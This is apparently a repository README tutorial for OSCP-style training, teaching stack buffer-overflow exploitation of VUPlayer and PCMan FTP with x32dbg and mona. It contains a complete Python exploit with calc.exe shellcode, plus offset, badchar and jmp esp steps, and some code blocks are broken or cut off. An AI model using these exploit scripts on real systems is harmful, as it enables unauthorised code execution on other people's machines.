# Fixing problems

If these README-steps dont works for you:
* try using my paths
* try disabling Antivirus (Defender)
* check if you are in command line Python (low right part)
* try delete some plugin in plugins\ & run again...
* delete the **PYTHONPATH** from your Environment Variables. If you need use Immunity Debugger make a .bat instead:
```
set PYTHONPATH=C:\Python27\Lib\site-packages;C:\Python27\Lib;C:\Python27\DLLs
start ImmunityDebugger.exe
```
* try it in a fresh virtual machine (without python stuff installed)

My working python ENV PATH:

# Bof example
We are going to exploit an application vulnerable to local Bof with the help of x32dbg; the vulnerable application is this one:
https://www.exploit-db.com/exploits/40018 or download it directly from this github with exploits included (VUPlayer.zip)

Once the applications are installed, both the vulnerable and the debugger we would have this:
![1](demo_photos/1.png)

Make sure to create the logs folder inside c:

![42](demo_photos/42.png)

Once opened we will have to configure mona, for it, we go to log and introduce these commands:
```
import mona
mona.mona("help")
mona.mona("config -set workingfolder c:\\logs\\%p")
```
![5](demo_photos/5.png)

![6](demo_photos/6.png)

![7](demo_photos/7.png)

![8](demo_photos/8.png)

If the previous commands were successful, it should look like this

![40](demo_photos/40.png)

Now hit File->Open and select the vulnerable program (select the .exe, not the shortcut).
![2](demo_photos/2.png)
![3](demo_photos/3.png)

Click twice on the Run icon to open the program.

![4](demo_photos/4.png)

Perfect, let's start with the attack, first we must find out how many characters we have to put to overflow the stack; to do this, without leaving the log we put the following command:
```
mona.mona("pattern_create 2000")
```

![9](demo_photos/9.png)

Copy the output of the command and paste it into a .txt file, then change the extension to .m3u.

![10](demo_photos/10.png)

![11](demo_photos/11.png)

![12](demo_photos/12.png)

Now in the application that opened the debugger we click File->Open Playlist....

![13](demo_photos/13.png)

Press run again twice to execute the select function correctly.

![4](demo_photos/4.png)

Select the file we have generated before, in my case Bof.m3u

![14](demo_photos/14.png)

In log we execute the following command and the output will tell us how many characters we have to write to overflow the stack
```
mona.mona("pattern_offset EIP")
```

![5](demo_photos/5.png)

![15](demo_photos/15.png)

![16](demo_photos/16.png)

As we can see, it tells us that there are 1012 characters, taking this into account, let's start creating the exploit with the information we have
```
#!/usr/bin/python
import subprocess
import os


shellcode_bind_shellfer = '\x41' * 1012 # padding


print("\nfile content (size " + str(len(shellcode_bind_shellfer))  + " bytes):\n")
print(":".join("{:02x}".format(ord(c)) for c in shellcode_bind_shellfer))

f = open('evil.m3u', 'wb')

f.write(shellcode_bind_shellfer)

f.close()
```

![17](demo_photos/17.png)

For now our script only has the overflow characters, now we have to find out the memory address to jump to and then run a shellcode that will open the calculator; we are going to use the debugger plugins to locate .dll that are not protected against ASLR

We are going to restart the program so that it does not remain as it is now, unusable; we go to Debug->Restart and then twice to run

![20](demo_photos/20.png)

![4](demo_photos/4.png)

Go to Plugins->checksec->check and when it loads we will see some unprotected .dll's.

![18](demo_photos/18.png)

![19](demo_photos/19.png)

Now we are going to use mona to see if we can locate any jmp esp of a .dll and then put the shellcode at the top of the stack and then we will have the return address that we have to put after the script characters to execute the shellcode once we have it.

We go to log and execute:
```
mona.mona("jmp -r esp -m *")
```

![5](demo_photos/5.png)

![21](demo_photos/21.png)

It shows us some jmp esp but it shows us a file where all the calls to jmp esp have been saved, we are going to open it and look for one that interests us

![22](demo_photos/22.png)

Let's use the notepad feature to search for "ASLR: False".

![23](demo_photos/23.png)

After passing a few we see this; as we can see, it uses a vulnerable .dll and in the memory address there are no bytes like \x00 which are usually badchars; it looks pretty good.

![24](demo_photos/24.png)

We are going to update the exploit adding the address we have just taken and now there is only one thing left, locate badchars and make the shellcode

We add this to the script between the padding and the print:
```
shellcode_bind_shellfer += '\x9f\x53\x10\x10' # ret addr
```

![25](demo_photos/25.png)

We use mona to generate all the possible characters and then we filter the badchars; first we go to log and put this:
```
mona.mona("bytearray")
```

![5](demo_photos/5.png)

![26](demo_photos/26.png)

We copy the characters and insert them at the end of the script like this:
```
shellcode_bind_shellfer += "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
shellcode_bind_shellfer += "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
shellcode_bind_shellfer += "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
shellcode_bind_shellfer += "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
shellcode_bind_shellfer += "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
shellcode_bind_shellfer += "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
shellcode_bind_shellfer += "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
shellcode_bind_shellfer += "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

![27](demo_photos/27.png)

![28](demo_photos/28.png)

Let's check the badchars, open cmd in the Desktop and run this:
```
python demo_exploit.py
```

![29](demo_photos/29.png)

Now we have to go to the debugger and in the vulnerable program load the evil.m3u file generated by the exploit

![13](demo_photos/13.png)

Twice:

![4](demo_photos/4.png)

![30](demo_photos/30.png)

We go to log and run this to check where it stopped copying characters and discover the first badchar, the address after the -f is given to us when we do the command mona.mona("bytearray")
```
mona.mona('compare -f C:\\logs\\VUPlayer\\bytearray.bin -a ESP')
```

![5](demo_photos/5.png)

![31](demo_photos/31.png)

In the output we see that from 00 on it does not copy us, we are going to generate again all the characters but removing the 00 like this:
```
mona.mona('bytearray -cpb "\\x00"')
```

![32](demo_photos/32.png)

![33](demo_photos/33.png)

Now we copy the output again, put it in the exploit removing the previous one, put it in the vulnerable program and execute it, and so on until we have all the badchars; I am going to do it only with images to make it faster; remember to restart the program every time you put an evil.m3u

![34](demo_photos/34.png)

![35](demo_photos/35.png)

![29](demo_photos/29.png)

![13](demo_photos/13.png)

![30](demo_photos/30.png)

![5](demo_photos/5.png)

![31](demo_photos/31.png)

![36](demo_photos/36.png)

![37](demo_photos/37.png)

After doing this process a couple of times, we found that the badchars are 00 09 0a and 1a

When we have this we only need to find a shellcode that does not use these badchars, we have this one:

https://packetstormsecurity.com/files/156478/Windows-x86-Null-Free-WinExec-Calc.exe-Shellcode.html

Adding the shellcode to our script would be finished and it looks like this:
```
#!/usr/bin/python
import subprocess
import os

# Windows\x86 - Null-Free WinExec Calc.exe Shellcode (195 bytes)
# https://packetstormsecurity.com/files/156478/Windows-x86-Null-Free-WinExec-Calc.exe-Shellcode.html
shellcode_calc = '\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2\x52\xff\xd0'

shellcode_bind_shellfer = '\x41' * 1012 # padding
shellcode_bind_shellfer += '\x9f\x53\x10\x10' # ret addr
shellcode_bind_shellfer += shellcode_calc

print("\nfile content (size " + str(len(shellcode_bind_shellfer))  + " bytes):\n")
print(":".join("{:02x}".format(ord(c)) for c in shellcode_bind_shellfer))

f = open('evil.m3u', 'wb')

f.write(shellcode_bind_shellfer)

f.close()
```

![38](demo_photos/38.png)

When we put in the cmd python exploit and put the evil.m3u in the vulnerable program will open the calculator and we would be all done!

![29](demo_photos/29.png)

![13](demo_photos/13.png)

![30](demo_photos/30.png)

![39](demo_photos/39.png)

The address of the vulnerable function is 004539DA

# Bof example OSCP like

Download the vuln app directly from this github with exploits included (pcman.zip)

We would have this:

![2 1](oscp_demo_photos/2.1.png)

Make sure to create the logs folder inside c:

![42](demo_photos/42.png)

Once opened we will have to configure mona, for it, we go to log and introduce these commands:

```
import mona
mona.mona("help")
mona.mona("config -set workingfolder c:\\logs\\%p")
```

![5](demo_photos/5.png)

![6](demo_photos/6.png)

![7](demo_photos/7.png)

![8](demo_photos/8.png)

If the previous commands were successful, it should look like this

![40](demo_photos/40.png)

Now hit File->Open and select the vulnerable program

![2 2](oscp_demo_photos/2.2.png)

![2 3](oscp_demo_photos/2.3.png)

Click four times on the Run icon to open the program

![4](demo_photos/4.png)

Perfect, let's start with the attack, first we must find out how many characters we have to put to overflow the stack; to do this, without leaving the log we put the following command:

```
mona.mona("pattern_create 3000")
```

![2 4](oscp_demo_photos/2.4.png)

Copy the output of the command and paste it into a .txt file

![2 5](oscp_demo_photos/2.5.png)

![2 6](oscp_demo_photos/2.6.png)

Now we start the script to be able to send to the FTP server the characters

```
#!/usr/bin/env python
from socket import *
from time import sleep
from sys import exit, exc_info

os.system("ifconfig eth0 mtu 3000")

![2 7](oscp_demo_photos/2.7.png)

Now execute the exploit

![2 8](oscp_demo_photos/2.8.png)

Once finished, we go to log and type the following command to find out the offset needed for the bof

```
mona.mona("pattern_offset EIP")
```

![5](demo_photos/5.png)

![15](demo_photos/15.png)

![2 9](oscp_demo_photos/2.9.png)

As we can see, it tells us that there are 2011 characters, taking this into account, let's modify the script:

```
shellcode = '\x41' * 2011
```

![3 0](oscp_demo_photos/3.0.png)

For now our script only has the overflow characters, now we have to find out the badchars for the shellcode

First we go to log and put this:
```
mona.mona("bytearray")
```

![5](demo_photos/5.png)

![26](demo_photos/26.png)

We copy the characters and insert them at the end of the script like this:

```
shellcode += "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
shellcode += "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
shellcode += "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
shellcode += "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
shellcode += "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
shellcode += "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
shellcode += "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
shellcode += "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

![27](demo_photos/27.png)

![3 1](oscp_demo_photos/3.1.png)

Now restart the app and then run the exploit

![20](demo_photos/20.png)

![4](demo_photos/4.png)

![2 8](oscp_demo_photos/2.8.png)

When finished we will see if the characters were copied, go to cpu->lower left window and right click->go to->expression and set esp.

![3 2](oscp_demo_photos/3.2.png)

![3 3](oscp_demo_photos/3.3.png)

As we can see, nothing has been copied, 00 badchar

![3 4](oscp_demo_photos/3.4.png)

Go to log and generate another bytearray without 00 with:

```
mona.mona('bytearray -cpb "\\x00"')
```

![5](demo_photos/5.png)

![33](demo_photos/33.png)

Now we copy the output again, put it in the exploit removing the previous one, run it, and so on until we have all the badchars; I am going to do it only with images to make it faster; remember to restart the program every time you run the exploit

![34](demo_photos/34.png)

![3 5](oscp_demo_photos/3.5.png)

![2 8](oscp_demo_photos/2.8.png)

![3 2](oscp_demo_photos/3.2.png)

![3 3](oscp_demo_photos/3.3.png)

![3 6](oscp_demo_photos/3.6.png)

![3 7](oscp_demo_photos/3.7.png)

After doing this process a couple of times, we found that the badchars are 00 0a and 0d

When we have this we only need to find a shellcode that does not use these badchars, we have this one:

https://packetstormsecurity.com/files/156478/Windows-x86-Null-Free-WinExec-Calc.exe-Shellcode.html

Adding the shellcode to our script should look like this, now we have to find a vuln ret address

```

![3 8](oscp_demo_photos/3.8.png)

now we have to find out the memory address to jump to and then run a shellcode that will open the calculator; we are going to use the debugger plugins to locate .dll that are not protected against ASLR

We are going to restart the program so that it does not remain as it is now, unusable; we go to Debug->Restart and then four times to run

![20](demo_photos/20.png)

![4](demo_photos/4.png)

![18](demo_photos/18.png)

![3 9](oscp_demo_photos/3.9.png)

Now we are going to use mona to see if we can locate any jmp esp of a .dll and then put the shellcode at the top of the stack and then we will have the return address that we have to put after the script characters to execute the shellcode once we have it.

We go to log and execute:

```
mona.mona("jmp -r esp")
```

![5](demo_photos/5.png)

![4 0](oscp_demo_photos/4.0.png)

![4 1](oscp_demo_photos/4.1.png)

The address I have pointed out looks pretty good, it has no x00 and ASLR disabled, let's add it to the script

```
shellcode += '\x9f\x53\x10\x10' # ret addr
```

![4 2](oscp_demo_photos/4.2.png)

Let's execute the script!

![2 8](oscp_demo_photos/2.8.png)

Failed, our direction looked good but... what happened? let's look at the stack, bottom right of the cpu.

![4 3](oscp_demo_photos/4.3.png)

If we go up the stack we can see that our address was passed correctly but the start of the shellcode is higher than it should be, why? easy, the vulnerable function executes a "ret 4" that after making the return removes from the stack the next 4 bytes, how to fix this? putting 4 bytes between the return address and the shellcode.

```
shellcode += 'BBBB'
```

![4 8](oscp_demo_photos/4.8.png)

The final script looks like this:

```
